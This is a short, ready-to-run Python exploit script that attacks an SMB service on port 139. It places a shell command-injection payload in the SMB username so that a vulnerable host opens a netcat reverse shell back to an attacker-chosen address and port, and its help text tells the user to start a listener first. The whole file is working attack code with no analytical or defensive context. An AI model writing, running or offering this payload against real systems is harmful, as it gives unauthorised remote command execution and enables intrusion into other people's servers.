#!/usr/bin/python3

from sys import exit
from smb.SMBConnection import SMBConnection
from signal import signal, SIGINT
import argparse

def handler(singnal_received, frame):
	#handle any cleanup here
	print('	[+]Exiting...')
	exit(0)

signal(SIGINT, handler)
parser=argparse.ArgumentParser(description='Please init netcat listener to get the reverse shell')
parser.add_argument("rhost", help="Input the address of the vulnerable host", type=str)
parser.add_argument("lhost", help="Input the address of the local host", type=str)
parser.add_argument("lport", help="Input the local nc port to receive the shell", type=str)
args = parser.parse_args()
rhost = args.rhost
lhost = args.lhost
lport = args.lport
rport = "139" #If necessary, edit this line

payload = "/=`nohup mkfifo /tmp/f; nc " + lhost + " " + lport + " 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`" # the payload sent
conn = SMBConnection(payload, "", "", "")
print("If there is a timeout error, went ok. Check your NC")
conn.connect(rhost, rport, timeout=1)

